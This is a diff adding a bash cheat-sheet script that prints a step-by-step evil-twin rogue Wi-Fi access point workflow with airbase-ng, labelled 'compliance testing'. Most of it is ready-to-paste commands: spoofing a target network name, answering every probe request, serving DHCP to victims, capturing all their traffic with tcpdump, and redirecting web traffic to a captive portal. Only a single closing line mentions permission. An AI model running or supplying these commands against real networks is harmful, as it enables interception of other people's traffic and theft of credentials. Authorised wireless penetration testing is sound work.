@@ -1,0 +1,45 @@
+#!/bin/bash
+echo -e "\033[32m╔══════════════════════════════════════╗"
+echo -e "║  📡 airbase-ng — Rogue Access Point ║"
+echo -e "║  Evil Twin / Compliance Testing     ║"
+echo -e "╚══════════════════════════════════════╝\033[0m"
+echo
+echo -e "\033[33m▶ Quick Compliance Test (copy-paste):\033[0m"
+echo -e "\033[37m  sudo airbase-ng -e \"CompanyWiFi\" -c 6 -P -C 60 wlan0mon\033[0m"
+echo
+echo -e "\033[33mWhat this does:\033[0m"
+echo "  -e CompanyWiFi    Broadcasts as target network name"
+echo "  -c 6              Uses channel 6 (check target channel first)"
+echo "  -P                Responds to ALL probe requests (max clients)"
+echo "  -C 60             Beacon every 60ms (aggressive advertising)"
+echo "  wlan0mon          Your monitor-mode interface"
+echo
+echo -e "\033[33mFull compliance testing workflow:\033[0m"
+echo "  # 1. Enable monitor mode"
+echo "  sudo airmon-ng start wlan0"
+echo
+echo "  # 2. Find target networks (note channel & BSSID)"
+echo "  sudo airodump-ng wlan0mon"
+echo
+echo "  # 3. Launch evil twin AP (aggressive mode)"
+echo "  sudo airbase-ng -e \"TargetCorp\" -c 6 -P -C 60 wlan0mon"
+echo
+echo "  # 4. Bring up interface & assign IP"
+echo "  sudo ifconfig at0 up 10.0.0.1/24"
+echo
+echo "  # 5. Start DHCP for connecting clients"
+echo "  sudo dnsmasq -i at0 --dhcp-range=10.0.0.10,10.0.0.100,12h"
+echo
+echo "  # 6. Capture all traffic (for reporting)"
+echo "  sudo tcpdump -i at0 -w compliance-capture.pcap"
+echo
+echo "  # 7. Optional: redirect to captive portal"
+echo "  sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
+echo
+echo -e "\033[33mLogging & Reporting:\033[0m"
+echo "  Clients connected:    cat /var/lib/misc/dnsmasq.leases"
+echo "  Probe requests seen:  sudo tcpdump -i wlan0mon type mgt subtype probe-req"
+echo "  Export for report:    sudo airodump-ng wlan0mon -w audit-report"
+echo
+echo -e "\033[31m⚠  Only use on networks you own or have written permission to test\033[0m"
+echo -e "\033[90m──────────────────────────────────────\033[0m"
